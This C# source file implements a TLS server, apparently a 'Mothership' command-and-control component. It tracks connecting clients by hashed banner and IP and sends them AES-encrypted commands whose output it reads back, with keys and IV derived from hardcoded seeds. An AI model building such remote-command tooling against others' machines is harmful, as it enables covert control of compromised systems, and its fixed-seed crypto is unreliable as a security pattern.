using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

using Mothership.Crypto;
using Mothership.Networking;

namespace Mothership.ClientServer
{
    public class ClientServer
    {
        public const int CLIENT_UID_LENGTH = 0x07;

        public const int CRYPTO_KEY_SEED = 0xBADA55;
        public const int CRYPTO_IV_SEED = 0x0C0BABE;

        public Dictionary<string, TcpClient> Clients { get; private set; }

        private TcpServer server;
        private byte[] aesKey;
        private byte[] aesIV;

        public ClientServer(int port, X509Certificate certificate)
        {
            server = new TcpServer(port, certificate);
            Clients = new Dictionary<string, TcpClient>();

            aesKey = AES.Generate16ByteArrayFromSeed(CRYPTO_KEY_SEED);
            aesIV = AES.Generate16ByteArrayFromSeed(CRYPTO_IV_SEED);
        }

        public void Disconnect(TcpClient client)
        {
            server_clientDisconnected(null, new ClientDisconnectedEventArgs(client));
        }
        
        public ClientResponse SendCommand(string uid, string cmd)
        {
            try
            {
                if (!Clients.ContainsKey(uid))
                    return new ClientResponse(true, string.Format("No such uid {0}!", uid));

                byte[] cmdData = ASCIIEncoding.ASCII.GetBytes(cmd);
                byte[] cmdEncrypted = AES.Encrypt(aesKey, aesIV, cmdData);
                Clients[uid].WriteLine(Convert.ToBase64String(cmdEncrypted));

                byte[] respEncrypted = Convert.FromBase64String(Clients[uid].ReadLine());
                byte[] respData = AES.Decrypt(aesKey, aesIV, respEncrypted);
                return new ClientResponse(false, ASCIIEncoding.ASCII.GetString(respData));
            }
            catch (Exception ex)
            {
                return new ClientResponse(true, ex.ToString());
            }
        }

        public void Start()
        {
            server.Start();

            server.ClientConnected += server_clientConnected;
            server.ClientDisconnected += server_clientDisconnected;
        }

        public void Stop()
        {
            server.Stop();
        }

        private void server_clientConnected(object sender, ClientConnectedEventArgs e)
        {
            e.Client.Banner = ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(e.Client.ReadLine()));
            var md5 = MD5.Create();
            byte[] hash = md5.ComputeHash(ASCIIEncoding.ASCII.GetBytes(e.Client.Banner + e.Client.IP));
            StringBuilder hexHash = new StringBuilder();
            for (int i = 0; i < CLIENT_UID_LENGTH; i++)
                hexHash.AppendFormat(hash[i].ToString("X2"));

            e.Client.UID = hexHash.ToString();
            Clients.Add(e.Client.UID, e.Client);
        }
        private void server_clientDisconnected(object sender, ClientDisconnectedEventArgs e)
        {
            try
            {
                if (Clients.ContainsKey(e.Client.UID))
                    Clients.Remove(e.Client.UID);
                e.Client.Close();
            }
            catch
            { }
        }
    }
}
